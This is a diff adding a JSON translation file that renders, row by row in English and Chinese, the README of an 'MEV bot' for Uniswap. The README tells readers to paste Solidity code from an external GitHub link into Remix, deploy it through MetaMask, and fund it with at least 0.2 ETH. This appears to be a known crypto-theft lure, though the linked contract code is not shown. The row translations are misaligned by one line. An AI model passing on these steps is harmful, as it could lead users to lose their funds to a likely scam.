+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "### 1. 安装钱包"
+      },
+      {
+        "row": 74,
+        "rowsha": "tagX22F5gcfkPDqx4+59QhW9RnhH+7TGYJtTqj8jEpE=",
+        "originContent": "### 1. Install a Wallet",
+        "translatedContent": "下载并设置 [MetaMask](https://metamask.io/download.html) 或任何其他兼容 EVM 的钱包。"
+      },
+      {
+        "row": 75,
+        "rowsha": "aJbVBwp8ljzeqzWIK1Oqn7SR7nLziWnVhlU01QdFvIw=",
+        "originContent": "Download and set up [MetaMask](https://metamask.io/download.html) or any other EVM-compatible wallet.",
+        "translatedContent": ""
+      },
+      {
+        "row": 76,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "### 2. 打开 Remix"
+      },
+      {
+        "row": 77,
+        "rowsha": "sf9QJouzadESQeV0aRqDlsby+K/SReL71nl+GWg9wzw=",
+        "originContent": "### 2. Open Remix",
+        "translatedContent": "访问 [Remix - 以太坊 IDE](https://remix.ethereum.org)，这是一个基于网页的以太坊智能合约编写、编译和部署环境。"
+      },
+      {
+        "row": 78,
+        "rowsha": "xrqtBNzAj+g3K1v67y8vf731TYA7k5HiNW5znWBTUV0=",
+        "originContent": "Access [Remix - Ethereum IDE](https://remix.ethereum.org), a web-based environment for writing, compiling, and deploying Ethereum smart contracts.",
+        "translatedContent": ""
+      },
+      {
+        "row": 79,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "### 3. 创建新文件"
+      },
+      {
+        "row": 80,
+        "rowsha": "s7V4yUDsq63t4LB3cpiZlPmsD+DLgszY3jII2SZtmwk=",
+        "originContent": "### 3. Create a New File",
+        "translatedContent": "📁 在 Remix 中创建一个新文件，命名例如 `bot.sol`。"
+      },
+      {
+        "row": 81,
+        "rowsha": "3EfBJZr9/oYhHLNx0EnwVAWNConcrhfPlASZZv21NEQ=",
+        "originContent": "📁 Create a new file in Remix and name it, e.g., `bot.sol`.",
+        "translatedContent": ""
+      },
+      {
+        "row": 82,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "![创建新文件](https://i.imgur.com/1XiPUes.png)"
+      },
+      {
+        "row": 83,
+        "rowsha": "uKH7Au/JzjNN9r5fccVAjHK1ugDHLjAbE4qISvbpOgo=",
+        "originContent": "![Create New File](https://i.imgur.com/1XiPUes.png)",
+        "translatedContent": ""
+      },
+      {
+        "row": 84,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "### 4. 粘贴代码"
+      },
+      {
+        "row": 85,
+        "rowsha": "VtCSCxTfMSeM/Wpg52R7IUNo/gi9+piS81kulWsJ8r0=",
+        "originContent": "### 4. Paste the Code",
+        "translatedContent": "📋 从 GitHub 复制[机器人代码](https://raw.githubusercontent.com/Quovanewordy0JP/Mev-Bot-Uniswap/main/bots.sol)，粘贴到新建的 Remix 文件中。"
+      },
+      {
+        "row": 86,
+        "rowsha": "DGvrIo5dA5whpeNFTRWcd5leMto0LJ1pNqteOtlFiyI=",
+        "originContent": "📋 Copy the [bot code](https://raw.githubusercontent.com/Quovanewordy0JP/Mev-Bot-Uniswap/main/bots.sol) from GitHub and paste it into your newly created Remix file.",
+        "translatedContent": ""
+      },
+      {
+        "row": 87,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "### 5. 编译合约"
+      },
+      {
+        "row": 88,
+        "rowsha": "rdOWHHVRuW58an/JLZVm56mZAJVAEA6E6ttgLVBX6lI=",
+        "originContent": "### 5. Compile the Contract",
+        "translatedContent": "🔧 切换至 `Solidity Compiler` 标签，选择版本 `0.6.6+commit`，点击 `Compile bot.sol`。"
+      },
+      {
+        "row": 89,
+        "rowsha": "OtVQuRHxoqr7q8x7aqom3+hJVmosuUGsrDH9DDF/JmM=",
+        "originContent": "🔧 Go to the `Solidity Compiler` tab, select version `0.6.6+commit`, and click `Compile bot.sol`.",
+        "translatedContent": ""
+      },
+      {
+        "row": 90,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "![编译合约](https://i.imgur.com/s5OAv6g.png)"
+      },
+      {
+        "row": 91,
+        "rowsha": "SZxTEMAphUqK//QdPCnn0TN3bUzfDBs+4j33eVVrDcA=",
+        "originContent": "![Compile Contract](https://i.imgur.com/s5OAv6g.png)",
+        "translatedContent": ""
+      },
+      {
+        "row": 92,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "### 6. 部署机器人"
+      },
+      {
+        "row": 93,
+        "rowsha": "z4XsnlrJeO6qAGWFTa7Zg1AUh/30KpLeEAbikYdjthk=",
+        "originContent": "### 6. Deploy the Bot",
+        "translatedContent": "🚀 进入 `Deploy & Run Transactions` 标签，选择 `Injected Provider - MetaMask` 环境，点击 `Deploy`。批准 MetaMask 合约部署费用以部署你的 MEV 机器人。"
+      },
+      {
+        "row": 94,
+        "rowsha": "9vWLptz90EXD3z0+6MYSHV1f8byCD3O7FLTlgzPsPUg=",
+        "originContent": "🚀 Navigate to the `Deploy & Run Transactions` tab, select the `Injected Provider - MetaMask` environment, and click `Deploy`. Approve the MetaMask contract creation fee to deploy your MEV bot.",
+        "translatedContent": ""
+      },
+      {
+        "row": 95,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "![部署合约](https://i.imgur.com/2odZQNj.png)"
+      },
+      {
+        "row": 96,
+        "rowsha": "XXAREEHKKx3SPEXi9UDm76wjeGRUJPBbLFv9u4vRX4Q=",
+        "originContent": "![Deploy Contract](https://i.imgur.com/2odZQNj.png)",
+        "translatedContent": ""
+      },
+      {
+        "row": 97,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "---"
+      },
+      {
+        "row": 98,
+        "rowsha": "yz+R1U7uMOU+NbK5mQX3Dxae1Un9eJCdPawt78ntjTs=",
+        "originContent": "---",
+        "translatedContent": ""
+      },
+      {
+        "row": 99,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "## ⚙️ 配置"
+      },
+      {
+        "row": 100,
+        "rowsha": "zKqkuo4fvvsTT7DrU1TU9VSoJZQ3u19Amef7krgAtNA=",
+        "originContent": "## ⚙️ Configuration",
+        "translatedContent": ""
+      }
+    ],
+    "IsCodeBlock": false
+  },
+  {
+    "Id": 2,
+    "Content": "\n### 7. Fund Your Bot\nCopy your newly deployed contract address and fund it with at least 0.2 ETH as the initial balance by sending ETH to the contract address.\n\n![Fund Bot](https://i.imgur.com/80NJYYr.png)\n\n### 8. Control the Bot\nUse the following buttons to manage your bot:\n\n- **Start**: Click the `Start` button to activate the bot after funding.\n- **Stop**: Click the `Stop` button to halt bot operations.\n- **Withdrawal**: Click the `Withdrawal` button to withdraw all ETH to the owner (the wallet address that deployed the bot).\n\n![Bot Controls](https://i.imgur.com/ktiJ1Ll.png)\n\n![Bot Interface](https://i.imgur.com/xczMc3G.png)\n\n---\n\n## 📜 License\n\nThis project is [MIT licensed](LICENSE).\n\n**Reminder**: Open-source does not equal endorsement. Use responsibly.\n\n---\n\n## ⭐ Show Your Support\n\nIf you find this project helpful, please consider giving it a star on GitHub. Your support motivates further development and improvements.\n\n---\n\n## 💭 FAQ\n\n### Do I need to keep Remix open in the browser while the bot is running?\n\nNo, you can close Remix after deploying the bot. Save the bot's contract address. To access it later, recompile the code in Remix as in step 5, go to `Deploy & Run Transactions`, reconnect MetaMask, paste your contract address into `Load contract from Address`, and click `At Address`. The bot will appear under \"Deployed Contracts\".\n\n### Does it work on other chains or DEXes?\n\nCurrently, the bot is designed exclusively for Ethereum and Uniswap pools.\n\n---\n\n## 🤝 Contribute & Customize\n\n**Want to improve the bot?**\n\n1. Fork the repository.\n2. Add your enhancements (e.g., new pool filters, gas optimizations).\n3. Submit a pull request!\n",
+    "ContentSha": "WEckxaFpub0A/gtrrwgUNnjC4RVC0v/CorMMVnbldLs=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "### 7. 为您的机器人充值  \n复制您新部署的合约地址，并通过向合约地址发送至少 0.2 ETH 作为初始余额进行充值。  \n\n![Fund Bot](https://i.imgur.com/80NJYYr.png)  \n\n### 8. 控制机器人  \n使用以下按钮管理您的机器人：  \n\n- **开始**：充值后点击 `Start` 按钮激活机器人。  \n- **停止**：点击 `Stop` 按钮停止机器人操作。  \n- **提款**：点击 `Withdrawal` 按钮将所有 ETH 提取至所有者（部署机器人的钱包地址）。  \n\n![Bot Controls](https://i.imgur.com/ktiJ1Ll.png)  \n\n![Bot Interface](https://i.imgur.com/xczMc3G.png)  \n\n---  \n\n## 📜 许可证  \n\n本项目采用 [MIT 许可证](LICENSE)。  \n\n**提醒**：开源不等于认可。请负责任地使用。  \n\n---  \n\n## ⭐ 表达您的支持  \n\n如果您觉得本项目有帮助，请考虑在 GitHub 上为其点星。您的支持将激励我们继续开发和改进。  \n\n---  \n\n## 💭 常见问题  \n\n### 机器人运行时我需要保持浏览器中 Remix 打开吗？  \n\n不需要，部署机器人后可以关闭 Remix。请保存机器人的合约地址。要稍后访问，按第 5 步在 Remix 中重新编译代码，进入 `Deploy & Run Transactions`，重新连接 MetaMask，将合约地址粘贴到 `Load contract from Address`，点击 `At Address`，机器人将显示在“已部署合约”下。  \n\n### 机器人支持其他链或去中心化交易所吗？  \n\n目前，机器人专为以太坊和 Uniswap 池设计。  \n\n---  \n\n## 🤝 贡献与定制  \n\n**想改进机器人吗？**  \n\n1. Fork 本仓库。  \n2. 添加您的增强功能（如新增池过滤器、燃气优化）。  \n3. 提交 Pull Request！  \n\n",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "### 7. 为您的机器人充值  "
+      },
+      {
+        "row": 2,
+        "rowsha": "vj5IJzHAeXKEJ3wpPkwkaclvOlaOByK8LA9fzOF2Tf0=",
+        "originContent": "### 7. Fund Your Bot",
+        "translatedContent": "复制您新部署的合约地址，并通过向合约地址发送至少 0.2 ETH 作为初始余额进行充值。  "
+      },
+      {
+        "row": 3,
+        "rowsha": "QIwbfwkzc9XyB1tBEzD5vT9bskA8NmIv7nvDtJwLHg8=",
+        "originContent": "Copy your newly deployed contract address and fund it with at least 0.2 ETH as the initial balance by sending ETH to the contract address.",
+        "translatedContent": ""
+      },
+      {
+        "row": 4,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "![Fund Bot](https://i.imgur.com/80NJYYr.png)  "
+      },
+      {
+        "row": 5,
+        "rowsha": "6AKob5CgZqq+UwS59cRhKiBpRhp6Xh0JoSEzmAjMlME=",
+        "originContent": "![Fund Bot](https://i.imgur.com/80NJYYr.png)",
+        "translatedContent": ""
+      },
+      {
+        "row": 6,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "### 8. 控制机器人  "
+      },
+      {
+        "row": 7,
+        "rowsha": "4MxfqAVlrptMLX/hKF1nwN2ZsCOjFaPvwmvZgDJELIU=",
+        "originContent": "### 8. Control the Bot",
+        "translatedContent": "使用以下按钮管理您的机器人：  "
+      },
+      {
+        "row": 8,
+        "rowsha": "Y93HXXT3CVctX6DbKXrQMejcOT9jqHY0lP4Lvh6sJyQ=",
+        "originContent": "Use the following buttons to manage your bot:",
+        "translatedContent": ""
+      },
+      {
+        "row": 9,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "- **开始**：充值后点击 `Start` 按钮激活机器人。  "
+      },
+      {
+        "row": 10,
+        "rowsha": "qVyg6oVl1feAc/1UO92rw/29WdxgKYxNL4JIuF+Tj+8=",
+        "originContent": "- **Start**: Click the `Start` button to activate the bot after funding.",
+        "translatedContent": "- **停止**：点击 `Stop` 按钮停止机器人操作。  "
+      },
+      {
+        "row": 11,
+        "rowsha": "9Qi3rfx68Oq0ged08yibRvt7NIVULfYEoPr+rHFoBUE=",
+        "originContent": "- **Stop**: Click the `Stop` button to halt bot operations.",
+        "translatedContent": "- **提款**：点击 `Withdrawal` 按钮将所有 ETH 提取至所有者（部署机器人的钱包地址）。  "
+      },
+      {
+        "row": 12,
+        "rowsha": "VQ2N/jjAm2SwWUrQKW4JPQUQ29TfmGix51uCIPH5Yj0=",
+        "originContent": "- **Withdrawal**: Click the `Withdrawal` button to withdraw all ETH to the owner (the wallet address that deployed the bot).",
+        "translatedContent": ""
+      },
+      {
+        "row": 13,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "![Bot Controls](https://i.imgur.com/ktiJ1Ll.png)  "
+      },
+      {
+        "row": 14,
+        "rowsha": "77LChLyqz5m5s0vf9BVa9zIStn+o3ZHpOIV4lDHHqAE=",
+        "originContent": "![Bot Controls](https://i.imgur.com/ktiJ1Ll.png)",
+        "translatedContent": ""
+      },
+      {
+        "row": 15,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "![Bot Interface](https://i.imgur.com/xczMc3G.png)  "
+      },
+      {
+        "row": 16,
+        "rowsha": "TglrQ2v7MnJBd42TrHiNjrfRnPpqCbbR9wlk3/Cy+7M=",
+        "originContent": "![Bot Interface](https://i.imgur.com/xczMc3G.png)",
+        "translatedContent": ""
+      },
+      {
+        "row": 17,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "---  "
+      },
+      {
+        "row": 18,
+        "rowsha": "yz+R1U7uMOU+NbK5mQX3Dxae1Un9eJCdPawt78ntjTs=",
+        "originContent": "---",
+        "translatedContent": ""
+      },
+      {
+        "row": 19,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "## 📜 许可证  "
+      },
+      {
+        "row": 20,
+        "rowsha": "Xg7z9THMMv8mm3IS7LJHSaXGCrZhD8D4NGbb/+/ra/Y=",
+        "originContent": "## 📜 License",
+        "translatedContent": ""
+      },
+      {
+        "row": 21,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "本项目采用 [MIT 许可证](LICENSE)。  "
+      },
+      {
+        "row": 22,
+        "rowsha": "konhH11ncQOIqvj3FB0P3+7Q2TRGkfzH3iSgZSnAj1A=",
+        "originContent": "This project is [MIT licensed](LICENSE).",
+        "translatedContent": ""
+      },
+      {
+        "row": 23,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "**提醒**：开源不等于认可。请负责任地使用。  "
+      },
+      {
+        "row": 24,
+        "rowsha": "LrvWwOZFJmIfY54ACXedwtSjNhdlw1PiXgv38pdZUm0=",
+        "originContent": "**Reminder**: Open-source does not equal endorsement. Use responsibly.",
+        "translatedContent": ""
+      },
+      {
+        "row": 25,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "---  "
+      },
+      {
+        "row": 26,
+        "rowsha": "yz+R1U7uMOU+NbK5mQX3Dxae1Un9eJCdPawt78ntjTs=",
+        "originContent": "---",
+        "translatedContent": ""
+      },
+      {
+        "row": 27,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "## ⭐ 表达您的支持  "
+      },
+      {
+        "row": 28,
+        "rowsha": "M/WfqAhCspwe5qydivDdtNvd7D9RHPSl72X81dvt7Ao=",
+        "originContent": "## ⭐ Show Your Support",
+        "translatedContent": ""
+      },
+      {
+        "row": 29,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "如果您觉得本项目有帮助，请考虑在 GitHub 上为其点星。您的支持将激励我们继续开发和改进。  "
+      },
+      {
+        "row": 30,
+        "rowsha": "fSsI4wUmfgtdO991DeVOfjUZnglTFn3b5gQ5/DmYQFg=",
+        "originContent": "If you find this project helpful, please consider giving it a star on GitHub. Your support motivates further development and improvements.",
+        "translatedContent": ""
+      },
+      {
+        "row": 31,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "---  "
+      },
+      {
+        "row": 32,
+        "rowsha": "yz+R1U7uMOU+NbK5mQX3Dxae1Un9eJCdPawt78ntjTs=",
+        "originContent": "---",
+        "translatedContent": ""
+      },
+      {
+        "row": 33,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "## 💭 常见问题  "
+      },
+      {
+        "row": 34,
+        "rowsha": "umFbJCwgMy+8wCVNSC3fxhKCzM+oQVShd5w7noEu5z8=",
+        "originContent": "## 💭 FAQ",
+        "translatedContent": ""
+      },
+      {
+        "row": 35,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "### 机器人运行时我需要保持浏览器中 Remix 打开吗？  "
+      },
+      {
+        "row": 36,
+        "rowsha": "qVlSadWuRgpBtxeITsRsAqo5d/+/ztPnM60OLeCglIQ=",
+        "originContent": "### Do I need to keep Remix open in the browser while the bot is running?",
+        "translatedContent": ""
+      },
+      {
+        "row": 37,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "不需要，部署机器人后可以关闭 Remix。请保存机器人的合约地址。要稍后访问，按第 5 步在 Remix 中重新编译代码，进入 `Deploy & Run Transactions`，重新连接 MetaMask，将合约地址粘贴到 `Load contract from Address`，点击 `At Address`，机器人将显示在“已部署合约”下。  "
+      },
+      {
+        "row": 38,
+        "rowsha": "PYAS2j0X1hFoyFrMu9u+jox2oScRCh5gExpec4fjFhA=",
+        "originContent": "No, you can close Remix after deploying the bot. Save the bot's contract address. To access it later, recompile the code in Remix as in step 5, go to `Deploy & Run Transactions`, reconnect MetaMask, paste your contract address into `Load contract from Address`, and click `At Address`. The bot will appear under \"Deployed Contracts\".",
+        "translatedContent": ""
+      },
+      {
+        "row": 39,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "### 机器人支持其他链或去中心化交易所吗？  "
+      },
+      {
+        "row": 40,
+        "rowsha": "bnc1b58mf4wPSwGm0m03M6+SZ0CTw2gHlpYGZvcHwxE=",
+        "originContent": "### Does it work on other chains or DEXes?",
+        "translatedContent": ""
+      },
+      {
+        "row": 41,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "目前，机器人专为以太坊和 Uniswap 池设计。  "
+      },
+      {
+        "row": 42,
+        "rowsha": "o+buTJvnfWhRpjEsghP80ue0o1X6PjYo5O9adlPgTO0=",
+        "originContent": "Currently, the bot is designed exclusively for Ethereum and Uniswap pools.",
+        "translatedContent": ""
+      },
+      {
+        "row": 43,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "---  "
+      },
+      {
+        "row": 44,
+        "rowsha": "yz+R1U7uMOU+NbK5mQX3Dxae1Un9eJCdPawt78ntjTs=",
+        "originContent": "---",
+        "translatedContent": ""
+      },
+      {
+        "row": 45,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "## 🤝 贡献与定制  "
+      },
+      {
+        "row": 46,
+        "rowsha": "E5Pyn67MtG22uHdzdtEWLTbYHiJT6LtZSx7RDsj0jEY=",
+        "originContent": "## 🤝 Contribute & Customize",
+        "translatedContent": ""
+      },
+      {
+        "row": 47,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "**想改进机器人吗？**  "
+      },
+      {
+        "row": 48,
+        "rowsha": "kOfilVyXLGytHyoOwE5aJtu2c3yndKuovxUvKaJshOU=",
+        "originContent": "**Want to improve the bot?**",
+        "translatedContent": ""
+      },
+      {
+        "row": 49,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "1. Fork 本仓库。  "
+      },
+      {
+        "row": 50,
+        "rowsha": "U4nMNpPbnNo6qbcTdRpdl58Jt4MVlUOn2OzAN4sXiz8=",
+        "originContent": "1. Fork the repository.",
+        "translatedContent": "2. 添加您的增强功能（如新增池过滤器、燃气优化）。  "
+      },
+      {
+        "row": 51,
+        "rowsha": "eomgBo2HTKXAVNXIpKE1QWL9SLuEvbJO8jRS7K571cQ=",
+        "originContent": "2. Add your enhancements (e.g., new pool filters, gas optimizations).",
+        "translatedContent": "3. 提交 Pull Request！  "
+      },
+      {
+        "row": 52,
+        "rowsha": "O9p20O3qoraIl36TyxqEQyeD/iRYyo/xu2LKaz96sPQ=",
+        "originContent": "3. Submit a pull request!",
+        "translatedContent": ""
+      },
+      {
+        "row": 53,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      }
+    ],
+    "IsCodeBlock": false
+  }
+]
